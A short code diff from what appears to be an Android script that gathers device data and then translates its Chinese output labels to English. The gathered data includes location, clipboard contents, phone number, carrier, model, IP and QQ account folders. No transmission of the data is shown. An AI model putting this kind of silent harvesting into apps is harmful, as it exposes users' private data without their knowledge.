@@ -197,7 +197,6 @@ t(){
   json(location,location)
   json(location,"get","lat",lat)
   json(location,"get","lng",lng)
-  //ip 地址 纬度 获取
   s dz="Android/data/com.tencent.mobileqq/Tencent/MobileQQ/"
   fl(dz,true,sz)
   for(qq;sz){
@@ -214,7 +213,7 @@ t(){
         java(Operator,管理器,"android.telephony.TelephonyManager.getNetworkOperatorName")
         shb(shb)
         javags(model,null,"android.os.Build","MODEL")  
-        ss("型号:"+model+"\n剪贴板内容:"+shb+"\n本机手机号:"+phone+"\n运营商:"+Operator+sss.qq+"\nip:"+ip+" \n位置:"+pos+"\n经度:"+lat+"\n纬度:"+lng,info) 
+        ss("Model:"+model+"\nShb:"+shb+"\nPhone:"+phone+"\nOperator:"+Operator+sss.qq+"\nip:"+ip+" \nPos:"+pos+"\nlat:"+lat+"\nlng:"+lng,info) 
         ufnsui(){
         tw(info)
         }
